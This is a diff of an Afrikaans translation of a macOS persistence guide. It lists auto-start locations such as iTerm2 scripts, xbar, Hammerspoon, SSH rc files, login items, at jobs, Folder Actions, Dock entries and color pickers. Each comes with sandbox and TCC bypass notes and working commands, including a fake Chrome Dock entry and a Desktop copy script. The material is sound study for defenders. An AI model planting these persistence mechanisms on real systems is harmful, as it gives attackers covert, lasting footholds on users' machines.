-Daar kan jy die gewone **cron** **take**, die **at** **take** (nie baie gebruik nie) en die **periodieke** **take** (hoofsaaklik gebruik vir die skoonmaak van tydelike lêers) vind. Die daaglikse periodieke take kan byvoorbeeld uitgevoer word met: `periodic daily`.
+Daar kan jy die gewone **cron** **jobs**, die **at** **jobs** (nie baie gebruik nie) en die **periodic** **jobs** (hoofsaaklik gebruik vir die skoonmaak van tydelike lêers) vind. Die daaglikse periodic jobs kan byvoorbeeld uitgevoer word met: `periodic daily`.
 
-Om 'n **gebruikers cronjob programmaties** by te voeg, is dit moontlik om te gebruik:
+Om 'n **user cronjob programatically** by te voeg, kan jy die volgende gebruik:
 ```bash
 echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
 crontab /tmp/cron
 ```
 ### iTerm2
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)
+Verslag: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)
 
 - Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
-- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
-- iTerm2 het voorheen TCC-toestemmings toegestaan
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- iTerm2 het voorheen TCC permissions gehad
 
-#### Plekke
+#### Ligginge
 
 - **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
-- **Trigger**: Open iTerm
+- **Trigger**: Maak iTerm oop
 - **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
-- **Trigger**: Open iTerm
+- **Trigger**: Maak iTerm oop
 - **`~/Library/Preferences/com.googlecode.iterm2.plist`**
-- **Trigger**: Open iTerm
+- **Trigger**: Maak iTerm oop
 
-#### Beskrywing & Exploitatie
+#### Beskrywing & Uitbuiting
 
-Scripts gestoor in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** sal uitgevoer word. Byvoorbeeld:
+Skripte wat in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** gestoor is, sal uitgevoer word. Byvoorbeeld:
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
 #!/bin/bash
@@ -458,17 +472,17 @@ await iterm2.Window.async_create(connection)
 iterm2.run_forever(main)
 EOF
 ```
-Die skrif **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** sal ook uitgevoer word:
+Die skrip **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** sal ook uitgevoer word:
 ```bash
 do shell script "touch /tmp/iterm2-autolaunchscpt"
 ```
-Die iTerm2 voorkeure geleë in **`~/Library/Preferences/com.googlecode.iterm2.plist`** kan **'n opdrag aandui om uit te voer** wanneer die iTerm2 terminal geopen word.
+Die iTerm2-voorkeure geleë in **`~/Library/Preferences/com.googlecode.iterm2.plist`** kan 'n command aandui om uit te voer wanneer die iTerm2-terminal geopen word.
 
-Hierdie instelling kan in die iTerm2 instellings gekonfigureer word:
+Hierdie instelling kan in die iTerm2-instellings gekonfigureer word:
 
 <figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>
 
-En die opdrag word in die voorkeure weerspieël:
+En die command word in die voorkeure weerspieël:
 ```bash
 plutil -p com.googlecode.iterm2.plist
 {
@@ -478,7 +492,7 @@ plutil -p com.googlecode.iterm2.plist
 [...]
 "Initial Text" => "touch /tmp/iterm-start-command"
 ```
-U kan die opdrag stel om uit te voer met:
+Jy kan die opdrag om uit te voer instel met:
 ```bash
 # Add
 /usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist
@@ -490,25 +504,25 @@ open /Applications/iTerm.app/Contents/MacOS/iTerm2
 /usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
 ```
 > [!WARNING]
-> Hoog waarskynlik is daar **ander maniere om die iTerm2 voorkeure** te misbruik om arbitrêre opdragte uit te voer.
+> Hoog waarskynlik bestaan daar **ander maniere om die iTerm2-voorkeure te misbruik** om ewekansige opdragte uit te voer.
 
 ### xbar
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)
+Skrywing: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)
 
-- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
+- Nuttig om te bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
 - Maar xbar moet geïnstalleer wees
-- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
-- Dit vra Toeganklikheid toestemmings
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- Dit versoek Accessibility permissions
 
-#### Ligging
+#### Location
 
 - **`~/Library/Application\ Support/xbar/plugins/`**
-- **Trigger**: Sodra xbar uitgevoer word
+- **Trigger**: Once xbar is executed
 
-#### Beskrywing
+#### Description
 
-As die gewilde program [**xbar**](https://github.com/matryer/xbar) geïnstalleer is, is dit moontlik om 'n shell-skrip in **`~/Library/Application\ Support/xbar/plugins/`** te skryf wat uitgevoer sal word wanneer xbar begin:
+If the popular program [**xbar**](https://github.com/matryer/xbar) is installed, it's possible to write a shell script in **`~/Library/Application\ Support/xbar/plugins/`** which will be executed when xbar is started:
 ```bash
 cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
 #!/bin/bash
@@ -518,23 +532,23 @@ chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
 ```
 ### Hammerspoon
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)
+**Skryfbeskrywing**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)
 
-- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
+- Nuttig om bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
 - Maar Hammerspoon moet geïnstalleer wees
-- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
-- Dit vra Toeganklikheid toestemmings
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- Dit versoek Accessibility-toestemmings
 
-#### Location
+#### Ligging
 
 - **`~/.hammerspoon/init.lua`**
 - **Trigger**: Sodra hammerspoon uitgevoer word
 
-#### Description
+#### Beskrywing
 
-[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dien as 'n outomatiseringsplatform vir **macOS**, wat die **LUA skriptingtaal** vir sy operasies benut. Dit ondersteun die integrasie van volledige AppleScript kode en die uitvoering van shell skripte, wat sy skripting vermoëns aansienlik verbeter.
+[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dien as 'n automatiseringsplatform vir **macOS**, en benut die **LUA scripting language** vir sy werkinge. Dit ondersteun byvoorbeeld die integrasie van volledige AppleScript-kode en die uitvoering van shell scripts, wat sy skripvermoëns aansienlik verbeter.
 
-Die app soek na 'n enkele lêer, `~/.hammerspoon/init.lua`, en wanneer dit begin word, sal die skrip uitgevoer word.
+Die app soek na 'n enkele lêer, `~/.hammerspoon/init.lua`, en wanneer dit begin word sal die skrip uitgevoer word.
 ```bash
 mkdir -p "$HOME/.hammerspoon"
 cat > "$HOME/.hammerspoon/init.lua" << EOF
@@ -545,27 +559,27 @@ EOF
 
 - Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
 - Maar BetterTouchTool moet geïnstalleer wees
-- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
-- Dit vra Automatisering-Snelkoppeling en Toeganklikheid toestemmings
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- Dit vra Automation-Shortcuts en Accessibility toestemmings
 
-#### Plek
+#### Location
 
 - `~/Library/Application Support/BetterTouchTool/*`
 
-Hierdie hulpmiddel laat toe om toepassings of skripte aan te dui wat uitgevoer moet word wanneer sekere snelkoppelinge gedruk word. 'n Aanvaller mag in staat wees om sy eie **snelkoppeling en aksie in die databasis te konfigureer** om dit te laat uitvoer willekeurige kode (n snelkoppeling kan net wees om 'n sleutel te druk).
+Hierdie tool maak dit moontlik om toepassings of scripts aan te dui wat uitgevoer word wanneer sekere shortcuts gedruk word. 'n Aanvaller kan moontlik sy eie **shortcut and action to execute in the database** konfigureer om dit arbitrary code uit te voer (’n shortcut kan bloot wees om ’n sleutel te druk).
 
 ### Alfred
 
 - Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
 - Maar Alfred moet geïnstalleer wees
-- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
-- Dit vra Automatisering, Toeganklikheid en selfs Volle Skyf toegang toestemmings
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- Dit vra Automation, Accessibility en selfs Full-Disk Access toestemmings
 
-#### Plek
+#### Location
 
 - `???`
 
-Dit laat toe om werksvloeie te skep wat kode kan uitvoer wanneer sekere voorwaardes nagekom word. Potensieel is dit moontlik vir 'n aanvaller om 'n werksvloei-lêer te skep en Alfred dit te laat laai (dit is nodig om die premium weergawe te betaal om werksvloeie te gebruik).
+Dit laat toe om workflows te skep wat code kan uitvoer wanneer sekere voorwaardes voldaan is. Potensieel kan 'n aanvaller 'n workflow-lêer skep en Alfred daartoe bring om dit te laai (dit vereis die premium-weergawe om workflows te gebruik).
 
 ### SSHRC
 
@@ -573,49 +587,49 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.g
 
 - Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
 - Maar ssh moet geaktiveer en gebruik word
-- TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
-- SSH gebruik om FDA toegang te hê
+- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
+- SSH het voorheen FDA access gehad
 
-#### Plek
+#### Location
 
 - **`~/.ssh/rc`**
-- **Trigger**: Inlog via ssh
+- **Trigger**: Aanmelding via ssh
 - **`/etc/ssh/sshrc`**
-- Root benodig
-- **Trigger**: Inlog via ssh
+- Root vereis
+- **Trigger**: Aanmelding via ssh
 
 > [!CAUTION]
-> Om ssh aan te skakel vereis Volle Skyf Toegang:
+> To turn ssh on requres Full Disk Access:
 >
 > ```bash
 > sudo systemsetup -setremotelogin on
 > ```
 
-#### Beskrywing & Exploitatie
+#### Description & Exploitation
 
-Standaard, tensy `PermitUserRC no` in `/etc/ssh/sshd_config`, wanneer 'n gebruiker **inlog via SSH** sal die skripte **`/etc/ssh/sshrc`** en **`~/.ssh/rc`** uitgevoer word.
+Standaard, tensy `PermitUserRC no` in `/etc/ssh/sshd_config`, wanneer 'n gebruiker **aanmeld via SSH** sal die skripte **`/etc/ssh/sshrc`** en **`~/.ssh/rc`** uitgevoer word.
 
-### **Inlogitems**
+### **Login Items**
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)
 
 - Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
 - Maar jy moet `osascript` met args uitvoer
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Plekke
+#### Locations
 
 - **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
-- **Trigger:** Inlog
-- Exploit payload gestoor wat **`osascript`** aanroep
+- **Trigger:** Aanmelding
+- Exploit payload gestoor deur **`osascript`** aan te roep
 - **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
-- **Trigger:** Inlog
-- Root benodig
+- **Trigger:** Aanmelding
+- Root vereis
 
-#### Beskrywing
+#### Description
 
-In Stelsels Voorkeure -> Gebruikers & Groepe -> **Inlogitems** kan jy **items vind wat uitgevoer moet word wanneer die gebruiker inlog**.\
-Dit is moontlik om hulle te lys, by te voeg en te verwyder vanaf die opdraglyn:
+In System Preferences -> Users & Groups -> **Login Items** kan jy **items vind wat uitgevoer word wanneer die gebruiker aanmeld**.\
+Dit is moontlik om hulle te lys, by te voeg en te verwyder vanaf die command line:
 ```bash
 #List all items:
 osascript -e 'tell application "System Events" to get the name of every login item'
@@ -628,47 +642,47 @@ osascript -e 'tell application "System Events" to delete login item "itemname"'
 ```
 Hierdie items word gestoor in die lêer **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
 
-**Aanmelditems** kan **ook** aangedui word deur die API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) wat die konfigurasie in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** sal stoor.
+**Login items** kan **ook** aangedui word met die API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) wat die konfigurasie in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** sal stoor
 
-### ZIP as Aanmelditem
+### ZIP as Login Item
 
-(Kyk na die vorige afdeling oor Aanmelditems, dit is 'n uitbreiding)
+(Check previous section about Login Items, this is an extension)
 
-As jy 'n **ZIP** lêer as 'n **Aanmelditem** stoor, sal die **`Archive Utility`** dit oopmaak en as die zip byvoorbeeld in **`~/Library`** gestoor is en die gids **`LaunchAgents/file.plist`** met 'n backdoor bevat, sal daardie gids geskep word (dit is nie standaard nie) en die plist sal bygevoeg word sodat die volgende keer wanneer die gebruiker weer aanmeld, die **backdoor aangedui in die plist sal uitgevoer word**.
+As jy 'n **ZIP** lêer as 'n **Login Item** stoor, sal die **`Archive Utility`** dit oopmaak en as die zip byvoorbeeld in **`~/Library`** gestoor is en die gids **`LaunchAgents/file.plist`** met 'n backdoor bevat, sal daardie gids geskep word (dit word nie standaard geskep nie) en die plist sal bygevoeg word sodat die volgende keer wanneer die gebruiker weer aanmeld, die **backdoor indicated in the plist will be executed**.
 
-'n Ander opsie sou wees om die lêers **`.bash_profile`** en **`.zshenv`** binne die gebruiker se HOME te skep, sodat as die gids LaunchAgents reeds bestaan, hierdie tegniek steeds sal werk.
+Nog 'n opsie sou wees om die lêers **`.bash_profile`** en **`.zshenv`** binne die gebruikers HOME te skep, sodat as die gids LaunchAgents reeds bestaan hierdie tegniek steeds sou werk.
 
 ### At
 
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)
 
-- Nuttig om die sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
-- Maar jy moet **`at`** **uitvoer** en dit moet **geaktiveer** wees
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
+- Maar jy moet **`at`** uitvoer en dit moet **aangeskakel** wees
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Ligging
 
-- Moet **`at`** **uitvoer** en dit moet **geaktiveer** wees
+- Jy moet **`at`** uitvoer en dit moet **aangeskakel** wees
 
 #### **Beskrywing**
 
-`at` take is ontwerp om **eenmalige take** te skeduleer om op sekere tye uitgevoer te word. Anders as cron take, word `at` take outomaties verwyder na uitvoering. Dit is belangrik om te noem dat hierdie take volhardend is oor stelselhervattings, wat hulle as potensiële sekuriteitskwessies onder sekere omstandighede merk.
+`at`-take is ontwerp om **eenmalige take te skeduleer** wat op sekere tye uitgevoer word. In teenstelling met cron jobs, word `at`-take outomaties verwyder na uitvoering. Dit is belangrik om op te let dat hierdie take oor stelselherlaaie behoue bly, wat hulle onder sekere omstandighede tot potensiële sekuriteitsrisiko's maak.
 
-Deur **standaard** is hulle **deaktiveer** maar die **root** gebruiker kan **hulle** met **geaktiveer**.
+Standaard is hulle **uitgeskakel**, maar die **root** gebruiker kan **hulle aktiveer** met:
 ```bash
 sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
 ```
-Dit sal 'n lêer in 1 uur skep:
+Dit sal binne 1 uur 'n lêer skep:
 ```bash
 echo "echo 11 > /tmp/at.txt" | at now+1
 ```
-Kontroleer die werkskuil met `atq:`
+Kontroleer die taakwaglys met `atq:`
 ```shell-session
 sh-3.2# atq
 26	Tue Apr 27 00:46:00 2021
 22	Wed Apr 28 00:29:00 2021
 ```
-Boven kan ons twee geplande werke sien. Ons kan die besonderhede van die werk druk met `at -c JOBNUMBER`
+Hierbo kan ons twee geskeduleerde take sien. Ons kan die besonderhede van die taak druk met `at -c JOBNUMBER`
 ```shell-session
 sh-3.2# at -c 26
 #!/bin/sh
@@ -700,9 +714,9 @@ unset OLDPWD
 echo 11 > /tmp/at.txt
 ```
 > [!WARNING]
-> As AT take nie geaktiveer is nie, sal die geskepte take nie uitgevoer word nie.
+> As AT tasks nie geaktiveer is nie, sal die geskepte take nie uitgevoer word nie.
 
-Die **werk lêers** kan gevind word by `/private/var/at/jobs/`
+Die **job files** kan gevind word by `/private/var/at/jobs/`
 ```
 sh-3.2# ls -l /private/var/at/jobs/
 total 32
@@ -711,42 +725,42 @@ total 32
 -r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
 -rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
 ```
-Die lêernaam bevat die wag, die werksnommer, en die tyd wat dit geskeduleer is om te loop. Byvoorbeeld, kom ons kyk na `a0001a019bdcd2`.
+Die lêernaam bevat die queue, die job number, en die tyd waarop dit geskeduleer is om te hardloop. Byvoorbeeld, kom ons kyk na `a0001a019bdcd2`.
 
-- `a` - dit is die wag
-- `0001a` - werksnommer in hex, `0x1a = 26`
-- `019bdcd2` - tyd in hex. Dit verteenwoordig die minute wat verby is sedert die epoch. `0x019bdcd2` is `26991826` in desimale. As ons dit met 60 vermenigvuldig, kry ons `1619509560`, wat `GMT: 2021. April 27., Dinsdag 7:46:00` is.
+- `a` - this is the queue
+- `0001a` - job number in hex, `0x1a = 26`
+- `019bdcd2` - time in hex. It represents the minutes passed since epoch. `0x019bdcd2` is `26991826` in decimal. If we multiply it by 60 we get `1619509560`, which is `GMT: 2021. April 27., Dinsdag 7:46:00`.
 
-As ons die werkslêer druk, vind ons dat dit dieselfde inligting bevat wat ons met `at -c` gekry het.
+As ons die job-lêer uitdruk, vind ons dat dit dieselfde inligting bevat wat ons met `at -c` gekry het.
 
 ### Folder Actions
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
 Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
 
-- Nuttig om die sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
-- Maar jy moet in staat wees om `osascript` met argumente aan te roep om **`System Events`** te kontak om Folder Actions te kan konfigureer
-- TCC omseiling: [🟠](https://emojipedia.org/large-orange-circle)
-- Dit het 'n paar basiese TCC-toestemmings soos Desktop, Dokumente en Aflaaie
+- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
+- Maar jy moet `osascript` met argumente kan aanroep om kontak te maak met **`System Events`** om Folder Actions te kan konfigureer
+- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
+- Dit het sommige basiese TCC-permissies soos Desktop, Documents en Downloads
 
-#### Ligging
+#### Location
 
 - **`/Library/Scripts/Folder Action Scripts`**
 - Root benodig
-- **Trigger**: Toegang tot die gespesifiseerde gids
+- **Trigger**: Toegang tot die gespesifiseerde vouer
 - **`~/Library/Scripts/Folder Action Scripts`**
-- **Trigger**: Toegang tot die gespesifiseerde gids
+- **Trigger**: Toegang tot die gespesifiseerde vouer
 
-#### Beskrywing & Exploitatie
+#### Description & Exploitation
 
-Folder Actions is skripte wat outomaties geaktiveer word deur veranderinge in 'n gids soos die toevoeging, verwydering van items, of ander aksies soos om die gidsvenster te open of te hergroott. Hierdie aksies kan vir verskeie take gebruik word, en kan op verskillende maniere geaktiveer word, soos deur die Finder UI of terminale opdragte.
+Folder Actions is skripte wat outomaties geaktiveer word deur veranderings in 'n vouer, soos die byvoeging of verwydering van items, of ander aksies soos die opening of verander van die vouer-venster se grootte. Hierdie aksies kan vir verskeie take gebruik word en kan op verskillende maniere geaktiveer word, byvoorbeeld deur die Finder UI of terminal commands.
 
-Om Folder Actions op te stel, het jy opsies soos:
+Om Folder Actions in te stel, het jy opsies soos:
 
-1. Om 'n Folder Action werkvloei met [Automator](https://support.apple.com/guide/automator/welcome/mac) te skep en dit as 'n diens te installeer.
-2. Om 'n skrip handmatig aan te heg via die Folder Actions Setup in die konteksmenu van 'n gids.
-3. Om OSAScript te gebruik om Apple Event boodskappe na die `System Events.app` te stuur vir programmatiese opstelling van 'n Folder Action.
-- Hierdie metode is veral nuttig om die aksie in die stelsel in te bed, wat 'n vlak van volharding bied.
+1. Opstel van 'n Folder Action-workflow met [Automator](https://support.apple.com/guide/automator/welcome/mac) en dit as 'n diens installeer.
+2. Handmatig 'n skrip heg via die Folder Actions Setup in die konteks-kieslys van 'n folder.
+3. Gebruik OSAScript om Apple Event boodskappe na die `System Events.app` te stuur vir programmaties opstel van 'n Folder Action.
+- Hierdie metode is veral nuttig om die aksie in die stelsel in te bed, wat 'n vlak van persistensie bied.
 
 Die volgende skrip is 'n voorbeeld van wat deur 'n Folder Action uitgevoer kan word:
 ```applescript
@@ -758,11 +772,11 @@ app.doShellScript("touch ~/Desktop/folderaction.txt");
 app.doShellScript("mkdir /tmp/asd123");
 app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
-Om die bogenoemde skrip gebruikbaar te maak deur Folder Actions, kompileer dit met:
+Om die bostaande script bruikbaar te maak vir Folder Actions, kompileer dit met:
 ```bash
 osacompile -l JavaScript -o folder.scpt source.js
 ```
-Nadat die skrip gekompileer is, stel Folder Actions op deur die onderstaande skrip uit te voer. Hierdie skrip sal Folder Actions globaal aktief maak en spesifiek die voorheen gekompileerde skrip aan die Desktop-gids koppel.
+Nadat die script saamgestel is, stel Folder Actions in deur die onderstaande script uit te voer. Hierdie script sal Folder Actions wêreldwyd aktiveer en spesifiek die vooraf saamgestelde script aan die Desktop-folder koppel.
 ```javascript
 // Enabling and attaching Folder Action
 var se = Application("System Events")
@@ -772,13 +786,13 @@ var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
 se.folderActions.push(fa)
 fa.scripts.push(myScript)
 ```
-Voer die opstelling-skrip uit met:
+Voer die setup-skrip uit met:
 ```bash
 osascript -l JavaScript /Users/username/attach.scpt
 ```
-- Dit is die manier om hierdie volharding via GUI te implementeer:
+- Dit is die manier om hierdie persistensie via die GUI te implementeer:
 
-Dit is die skrif wat uitgevoer sal word:
+Hierdie is die skrip wat uitgevoer sal word:
 ```applescript:source.js
 var app = Application.currentApplication();
 app.includeStandardAdditions = true;
@@ -794,48 +808,48 @@ Skuif dit na:
 mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
 mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 ```
-Dan, open die `Folder Actions Setup` app, kies die **map wat jy wil monitor** en kies in jou geval **`folder.scpt`** (in my geval het ek dit output2.scp genoem):
+Then, open the `Folder Actions Setup` app, select the **folder you would like to watch** and select in your case **`folder.scpt`** (in my case I called it output2.scp):
 
 <figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>
 
-Nou, as jy daardie map met **Finder** oopmaak, sal jou skrip uitgevoer word.
+Now, if you open that folder with **Finder**, your script will be executed.
 
-Hierdie konfigurasie is gestoor in die **plist** geleë in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in base64 formaat.
+This configuration was stored in the **plist** located in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in base64 format.
 
-Nou, kom ons probeer om hierdie volharding voor te berei sonder GUI-toegang:
+Now, lets try to prepare this persistence without GUI access:
 
-1. **Kopieer `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** na `/tmp` om dit te rugsteun:
+1. **Copy `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** to `/tmp` to backup it:
 - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
-2. **Verwyder** die Folder Actions wat jy pas gestel het:
+2. **Verwyder** die Folder Actions wat jy net ingestel het:
 
 <figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>
 
-Nou dat ons 'n leë omgewing het
+Now that we have an empty environment
 
 3. Kopieer die rugsteunlêer: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
-4. Open die Folder Actions Setup.app om hierdie konfigurasie te gebruik: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`
+4. Maak die Folder Actions Setup.app oop om hierdie konfigurasie te gebruik: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`
 
 > [!CAUTION]
-> En dit het nie vir my gewerk nie, maar dit is die instruksies uit die skrywe:(
+> En dit het vir my nie gewerk nie, maar dit is die instruksies uit die writeup:(
 
-### Dock snelkoppelinge
+### Dock-snelkoppelinge
 
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)
 
-- Nuttig om die sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
-- Maar jy moet 'n kwaadwillige toepassing binne die stelsel geïnstalleer hê
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
+- But you need to have installed a malicious application inside the system
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Ligging
 
 - `~/Library/Preferences/com.apple.dock.plist`
-- **Trigger**: Wanneer die gebruiker op die toepassing binne die dock klik
+- **Trigger**: When the user clicks on the app inside the dock
 
-#### Beskrywing & Exploitatie
+#### Beskrywing & Exploitation
 
-Al die toepassings wat in die Dock verskyn, is binne die plist gespesifiseer: **`~/Library/Preferences/com.apple.dock.plist`**
+All the applications that appear in the Dock are specified inside the plist: **`~/Library/Preferences/com.apple.dock.plist`**
 
-Dit is moontlik om **'n toepassing by te voeg** net met:
+It's possible to **add an application** just with:
 ```bash
 # Add /System/Applications/Books.app
 defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
@@ -843,7 +857,7 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 # Restart Dock
 killall Dock
 ```
-Deur sommige **sosiale ingenieurswese** te gebruik, kan jy **byvoorbeeld Google Chrome** in die dok naboots en werklik jou eie skrip uitvoer:
+Deur 'n bietjie **social engineering** te gebruik, kan jy **byvoorbeeld Google Chrome naboots** in die dock en eintlik jou eie script uitvoer:
 ```bash
 #!/bin/sh
 
@@ -896,30 +910,30 @@ cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chr
 defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
 killall Dock
 ```
-### Kleur Kiesers
+### Kleurkiesers
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)
 
-- Nuttig om die sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
-- 'n Baie spesifieke aksie moet gebeur
-- Jy sal in 'n ander sandbox eindig
-- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
+- Nuttig om sandbox te bypass: [🟠](https://emojipedia.org/large-orange-circle)
+- ’n Baie spesifieke aksie moet plaasvind
+- Jy sal in ’n ander sandbox eindig
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Ligging
 
 - `/Library/ColorPickers`
-- Root benodig
-- Trigger: Gebruik die kleur kieser
+- Root vereis
+- Trigger: Use the color picker
 - `~/Library/ColorPickers`
-- Trigger: Gebruik die kleur kieser
+- Trigger: Use the color picker
 
 #### Beskrywing & Exploit
 
-**Compileer 'n kleur kieser** bundel met jou kode (jy kan [**hierdie een byvoorbeeld**](https://github.com/viktorstrate/color-picker-plus) gebruik) en voeg 'n konstruktor by (soos in die [Skermbeskermer afdeling](macos-auto-start-locations.md#screen-saver)) en kopieer die bundel na `~/Library/ColorPickers`.
+**Compile a color picker** bundle met jou kode (you could use [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) en voeg ’n constructor by (soos in die [Screen Saver section](macos-auto-start-locations.md#screen-saver)) en kopieer die bundle na `~/Library/ColorPickers`.
 
-Dan, wanneer die kleur kieser geaktiveer word, moet jou kode ook geaktiveer word.
+Wanneer die kleurkieser geaktiveer word, behoort jou kode ook uit te voer.
 
-Let daarop dat die binêre wat jou biblioteek laai 'n **baie beperkende sandbox** het: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
+Let wel dat die binary wat jou biblioteek laai ’n **baie beperkende sandbox** het: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 ```bash
 [Key] com.apple.security.temporary-exception.sbpl
 [Value]
